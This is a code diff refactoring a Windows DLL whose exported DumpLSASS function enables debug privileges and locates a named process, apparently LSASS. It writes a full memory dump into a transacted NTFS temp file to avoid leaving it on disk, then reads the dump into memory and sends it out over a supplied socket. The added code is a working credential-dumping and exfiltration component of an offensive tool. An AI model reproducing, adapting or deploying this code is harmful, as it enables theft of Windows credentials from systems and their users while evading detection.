@@ -17,6 +17,7 @@
 #include <ktmw32.h>
 #include <winsock2.h>
 #include <string.h>
+#include "Common.h"
 
 #pragma comment (lib, "dbghelp") 
 #pragma comment(lib, "KtmW32.lib")
@@ -134,59 +135,52 @@ int Send_via_sokcet(char* ip4, int port, LPVOID buffer, int size)
 
 int Socketsend(SOCKET SendingSocket, LPVOID buffer, int size)
 {
-	return (send(SendingSocket, (char*)buffer, size, 0));
+	return send(SendingSocket, (char*)buffer, size, 0);
 }
 
-bool enableDebugPrivileges()
+BOOL EnableDebugPrivileges()
 {
-	HANDLE hcurrent = GetCurrentProcess();
+	HANDLE hCurrentProcess = GetCurrentProcess();
+	HANDLE hProcessToken;
+	LUID luID; 
+	TOKEN_PRIVILEGES tpNewToken, tpPreviousToken;
+	DWORD dwReturnLength;
 
-	if (!hcurrent)
+	if (!hCurrentProcess)
 	{
-		//std::cout << "could not open current process " << GetLastError() << "\n";
-		//system("pause");
-		exit(0);
-	}
-
-	HANDLE hToken;
-
-	BOOL bret = OpenProcessToken(hcurrent, 40, &hToken);
-
-	if (!bret)
-	{
-		//std::cout << "could not open token error code " << GetLastError() << "\n";
-		//system("pause");
-		exit(0);
-	}
-
-	LUID luid;
-	bret = LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luid);
-
-	if (!bret)
-	{
-		//std::cout << "LookupPrivilegeValue error: " << GetLastError() << "\n";
-		//system("pause");
+		PERROR("EnableDebugPrivileges(): GetCurrentProcess");
 		return FALSE;
 	}
 
-	TOKEN_PRIVILEGES NewState, PreviousState;
-	DWORD ReturnLength;
-	NewState.PrivilegeCount = 1;
-	NewState.Privileges[0].Luid = luid;
-	NewState.Privileges[0].Attributes = 2;
-	if (!AdjustTokenPrivileges(hToken, FALSE, &NewState, 28, &PreviousState, &ReturnLength))
+	BOOL bRet = OpenProcessToken(hCurrentProcess, 40, &hProcessToken);
+	if (!bRet)
 	{
-		//std::cout << "AdjustTokenPrivileges error: " << GetLastError() << "\n";
+		PERROR("EnableDebugPrivileges(): OpenProcessToken\n");
+		return FALSE;
+	}
+
+	bRet = LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luID);
+
+	if (!bRet)
+	{
+		PERROR("EnableDebugPrivileges(): LookupPrivilegeValue\n");
+		return FALSE;
+	}
+
+	tpNewToken.PrivilegeCount = 1;
+	tpNewToken.Privileges[0].Luid = luID;
+	tpNewToken.Privileges[0].Attributes = 2;
+	if (!AdjustTokenPrivileges(hProcessToken, FALSE, &tpNewToken, 28, &tpPreviousToken, &dwReturnLength))
+	{
+		PERROR("EnableDebugPrivileges(): AdjustTokenPrivileges\n");
 		return FALSE;
 
 	}
 	return TRUE;
 }
 
-void WriteFullDump(HANDLE hProc, HANDLE hFile)
+DWORD WriteFullDump(HANDLE hProc, HANDLE hFile)
 {
-
-
 	const DWORD Flags = MiniDumpWithFullMemory |
 		MiniDumpWithFullMemoryInfo |
 		MiniDumpWithHandleData |
@@ -201,94 +195,59 @@ void WriteFullDump(HANDLE hProc, HANDLE hFile)
 		NULL,
 		NULL);
 
-
 	if (!Result)
 	{
-		//std::cout << "Looks like an error: MiniDumpWriteDump failed error code " << GetLastError();
-		exit(0);
+		PERROR("MiniDumpWriteDump");
+		return 0;
 	}
 
+	return 1;
 }
 
 
 DWORD FindProcessId(const char *processname)
 {
-	//std::cout << "trying to find PID of " << processname << "\n";
+	INFO("Search pid of %s\n", processname);
+
 	HANDLE hProcessSnap;
 	PROCESSENTRY32 pe32;
-	DWORD result = NULL;
+	DWORD dwResult = NULL;
 
 	// Take a snapshot of all processes in the system.
 	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
 	if (INVALID_HANDLE_VALUE == hProcessSnap)
-		return(FALSE);
+	{
+		return 0;
+	}
 
-	pe32.dwSize = sizeof(PROCESSENTRY32); // <----- IMPORTANT
-
-										  // Retrieve information about the first process,
-										  // and exit if unsuccessful
+	pe32.dwSize = sizeof(PROCESSENTRY32);
 	if (!Process32First(hProcessSnap, &pe32))
 	{
-		CloseHandle(hProcessSnap);          // clean the snapshot object
-		//std::cout << "Failed to gather information on system processes! error code " << GetLastError() << "\n";
-		system("pause");
-		return(NULL);
+		CloseHandle(hProcessSnap);         
+		PERROR("FindProcessId(): Process32First");
+		return 0;
 	}
 
 	do
 	{
 		if (0 == strcmp(processname, pe32.szExeFile))
 		{
-			//std::cout << "process " << pe32.szExeFile << "\n";
-			result = pe32.th32ProcessID;
+			dwResult = pe32.th32ProcessID;
 			break;
 		}
 	} while (Process32Next(hProcessSnap, &pe32));
 
 	CloseHandle(hProcessSnap);
 
-	if (result == 0)
+	if (dwResult == 0)
 	{
-		//std::cout << "could not find pid gle " << GetLastError() << "\n";
-		system("pause");
-		exit(0);
+		INFO("FindProcessId: Could not find pid of %s\n", processname);
+		return 0;
 
 	}
-
-	//std::cout << "the PID is " << result << "\n";
-
-
-	return result;
-}
-
-
-int save_dump_to_memory(LPVOID mem, HANDLE file, SIZE_T size)
-{
-	DWORD bytesRead;
-	ReadFile(file, mem, size, &bytesRead, NULL);
-	//std::cout << "read " << bytesRead << " from the transacted file in memory \n";
-
-	if (!bytesRead)
-	{
-		//	std::cout << "could not save dump to memory error code " << GetLastError() << "\n";
-		system("pause");
-		exit(0);
-	}
-
-	return bytesRead;
-}
-
-LPVOID AllocateMemoryToDump(HANDLE process, SIZE_T size)
-{
-	LPVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_READWRITE);
-	if (!mem)
-	{
-
-		//std::cout << "could not allocate error code " << GetLastError() << "\n";
-		system("pause");
-	}
-	memset(mem, '\xcc', size);
-	return(mem);
+	
+	INFO("Found process id: %s --> %d\n", processname, dwResult);
+	return dwResult;
 }
 
 void validate_arguments(int argc, char **argv)
@@ -300,110 +259,91 @@ void validate_arguments(int argc, char **argv)
 	}
 }
 
-void create_file_path(char *file_name)
-{
-	if (!ExpandEnvironmentStrings("%temp%", (LPSTR)file_name, 150))
-	{
-		//	std::cout << "could not expand envirmoent variable error code " << GetLastError() << "\n";
-		exit(0);
-	}
-
-	strcat_s(file_name, 150, "\\trans_file");
-
-	//std::cout << "file path " << file_name << "\n";
-}
-
-void open_process(DWORD pid, PHANDLE process)
-{
-	*process = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE | THREAD_ALL_ACCESS, FALSE, pid);
-	if (!*process)
-	{
-		//	std::cout << "could not open process handle error code " << GetLastError() << "\n";
-		system("pause");
-		exit(0);
-	}
-}
-
-void create_transactional_ntfs(char* file_name, DWORD desiredAccess, DWORD dwCreationDisposition, PHANDLE trans_Handle, PHANDLE trans_file)
-{
-	if (*trans_Handle == NULL)
-	{
-		*trans_Handle = CreateTransaction(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
-		if (trans_Handle == INVALID_HANDLE_VALUE)
-		{
-			//	std::cout << "Error CreateTransaction(): GLE= " << GetLastError() << "\n";
-			exit(1);
-		}
-	}
-
-	USHORT PUSHMINIVERSION = 0xFFFF;
-	*trans_file = CreateFileTransactedA(file_name, desiredAccess, 0, nullptr, dwCreationDisposition, FILE_ATTRIBUTE_NORMAL, NULL, *trans_Handle, &PUSHMINIVERSION, NULL);
-	if (*trans_file == INVALID_HANDLE_VALUE)
-	{
-		//	std::cout << "Error CreateFileTransactedA(): GLE= " << GetLastError() << "\n";
-		exit(1);
-	}
-
-}
-
-
-
 extern "C" __declspec(dllexport) int DumpLSASS(SOCKET sock, char* proc_name)
 {
 
-	HANDLE process;
-	DWORD pid;
-	HANDLE trans_Handle = 0;
-	HANDLE trans_file;
-	LPVOID mem;
-	DWORD size;
-	char file_name[150];
+	HANDLE hProcess;
+	DWORD dwPid;
+	HANDLE hTransactionHandle, hTransactionFile = NULL;
+	LPVOID lpMem = NULL;
+	USHORT PUSHMINIVERSION = 0xFFFF;
+	char pcFileName[150];
+	DWORD bytesRead;
 
-	if (!enableDebugPrivileges())
+	if (!EnableDebugPrivileges())
 	{
-		//	std::cout << " could not enable debug gle " << GetLastError() << "\n";
-		exit(0);
+		exit(1);
 	}
 
-	pid = FindProcessId(proc_name);
-
-	if (!pid)
+	dwPid = FindProcessId(proc_name);
+	if (!dwPid)
 	{
-		//std::cout << " could not get pid " << GetLastError() << "\n";
-		exit(0);
+		exit(1);
 	}
 
-	open_process(pid, &process);
+	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_DUP_HANDLE | THREAD_ALL_ACCESS, FALSE, dwPid);
+	if (INVALID_HANDLE_VALUE == hProcess)
+	{
+		PERROR("OpenProcess");
+		exit(1);
+	}
 
-	create_file_path(file_name);
+	if (!ExpandEnvironmentStrings("%temp%", (LPSTR)pcFileName, 150))
+	{
+		PERROR("ExpandEnvironmentStrings");
+		exit(1);
+	}
+	strcat_s(pcFileName, 150, "\\trans_file");
 
-	create_transactional_ntfs(file_name, GENERIC_WRITE, CREATE_ALWAYS, &trans_Handle, &trans_file);
+	hTransactionHandle = CreateTransaction(NULL, NULL, NULL, NULL, NULL, NULL, NULL);
+	if (hTransactionHandle == INVALID_HANDLE_VALUE)
+	{
+		PERROR("CreateTransaction");
+		exit(1);
+	}
 
-	WriteFullDump(process, trans_file);
+	hTransactionFile = CreateFileTransactedA(pcFileName, GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL, hTransactionHandle, &PUSHMINIVERSION, NULL);
+	if (INVALID_HANDLE_VALUE == hTransactionFile)
+	{
+		PERROR("CreateFileTransacted");
+		exit(1);
+	}
 
-	CloseHandle(trans_file);
+	if (!WriteFullDump(hProcess, hTransactionFile))
+	{
+		exit(1);
+	}
 
-	create_transactional_ntfs(file_name, GENERIC_READ, OPEN_EXISTING, &trans_Handle, &trans_file);
+	CloseHandle(hTransactionFile);
 
-	//GetFileSize(trans_file, &size);
+	hTransactionFile = CreateFileTransactedA(pcFileName, GENERIC_READ, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL, hTransactionHandle, &PUSHMINIVERSION, NULL);
+	if (INVALID_HANDLE_VALUE == hTransactionFile)
+	{
+		PERROR("CreateFileTransacted");
+		exit(1);
+	}
 
-	//std::cout << "file size is " << size << " GLE " << GetLastError() << "\n";
+	lpMem = VirtualAlloc(NULL, SIZE, MEM_COMMIT, PAGE_READWRITE);
+	if (!lpMem)
+	{
+		PERROR("VirtualAlloc");
+		exit(1);
+	}
+	memset(lpMem, '\xcc', SIZE);
 
-	mem = AllocateMemoryToDump(process, SIZE);
+	ReadFile(hTransactionFile, lpMem, SIZE, &bytesRead, NULL);
 
-	int dump_size = save_dump_to_memory(mem, trans_file, SIZE);
+	if (bytesRead == 0)
+	{
+		PERROR("ReadFile");
+		exit(1);
+	}
 
-	CloseHandle(trans_Handle);
+	CloseHandle(hTransactionHandle);
+	CloseHandle(hTransactionFile);
 
-	CloseHandle(trans_file);
-
-	return Socketsend(sock, mem, dump_size);
-
-
-
+	return Socketsend(sock, lpMem, bytesRead);
 }
-
-
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
 {
